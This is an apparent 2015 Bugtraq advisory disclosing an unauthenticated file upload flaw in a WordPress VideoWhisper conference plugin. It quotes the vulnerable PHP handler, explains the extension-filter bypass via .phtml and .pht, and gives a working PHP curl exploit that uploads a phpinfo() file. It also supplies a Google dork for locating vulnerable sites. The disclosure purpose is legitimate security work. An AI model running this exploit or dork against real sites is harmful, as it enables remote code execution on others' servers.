
Date: Thu, 02 Apr 2015 21:55:41 -0400
From: "Larry W. Cashdollar" <larry0@...com>
To: "bugtraq@...urityfocus.com" <bugtraq@...urityfocus.com>
Subject: Remote file upload vulnerability in
 videowhisper-video-conference-integration wordpress plugin v4.91.8

Title: Remote file upload vulnerability in videowhisper-video-conference-integration wordpress plugin v4.91.8
Author: Larry W. Cashdollar, @_larry0
Date: 2015-03-29
Download Site: https://wordpress.org/support/plugin/videowhisper-video-conference-integration
Vendor: http://www.videowhisper.com/
Vendor Notified: 2015-03-29 wonâ€™t fix, http://www.videowhisper.com/tickets_view.php?t=10019545-1427810822 
Vendor Contact: http://www.videowhisper.com/tickets_submit.php
Description: VideoWhisper Video Conference is a modern web based multiple way video chat and real time file sharing tool.  Read more on WordPress Video Conference plugin home page.
Vulnerability:
./videowhisper-video-conference-integration/vc/vw_upload.php

*Update*  You can directly execute php by uploading file extension ending in .phtml or .rhtml as long as the extension isn't defined in the 
apache mime.types.

Allows various remote unauthenticated file uploads,  among the file types is html where the last 4 characters are only being checked in a 
file name to match which types are allowed.  Because of this .phtml can be passed through and remote code execution allowed.  
The code does not do any user access validation and therefore anyone can upload the following files to an unsuspecting wordpress site:

.shtml,swf,.zip,.rar,.jpg,jpeg,.png,.gif,.txt,.doc,docx,.htm,html,.pdf,.mp3,.flv,.avi,.mpg,.ppt,.pps

The if (strstr($filename,'.php')) exit; can be by passed by using the extension .pht.

<?php

if ($_GET["room"]) $room=$_GET["room"];
if ($_POST["room"]) $room=$_POST["room"];
$filename=$_FILES['vw_file']['name'];

include_once("incsan.php");
sanV($room);
if (!$room) exit;
sanV($filename);
if (!$filename) exit;

if (strstr($filename,'.php')) exit;

//do not allow uploads to other folders
if ( strstr($room,"/") || strstr($room,"..") ) exit;
if ( strstr($filename,"/") || strstr($filename,"..") ) exit;

$destination="uploads/".$room."/";
if ($_GET["slides"]) $destination .= "slides/";

$ext=strtolower(substr($filename,-4));
$allowed=array(".swf",".zip",".rar",".jpg","jpeg",".png",".gif",".txt",".doc","docx",".htm","html",".pdf",".mp3",".flv",".avi",".mpg",".ppt",".pps");

if (in_array($ext,$allowed)) move_uploaded_file($_FILES['vw_file']['tmp_name'], $destination . $filename);
?>loadstatus=1

CVEID:
OSVDB:
Exploit Code:
	 <?php
	  
	 $uploadfile="upexp.phtml";
	 $ch = 
	 curl_init("http://target_site/wp-content/plugins/videowhisper-video-conference-integration/vc/vw_upload.php");
	 curl_setopt($ch, CURLOPT_POST, true);
	 curl_setopt($ch, CURLOPT_POSTFIELDS,
	          array('vw_file'=>"@$uploadfile",'name'=>'upexp.phtml','room'=>'.'));
	 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	 $postResult = curl_exec($ch);
	 curl_close($ch);
	 print "$postResult";
	  
	 ?>
	  
	 upexp.phtml
	  
	 <?php
	 phpinfo();
	 ?>
	 The executeable should be located in wordpress/wp-content/plugins/videowhisper-video-conference-integration/vc/uploads.

         Google dork: inurl:/wp-content/plugins/videowhisper-video-conference-integration/ 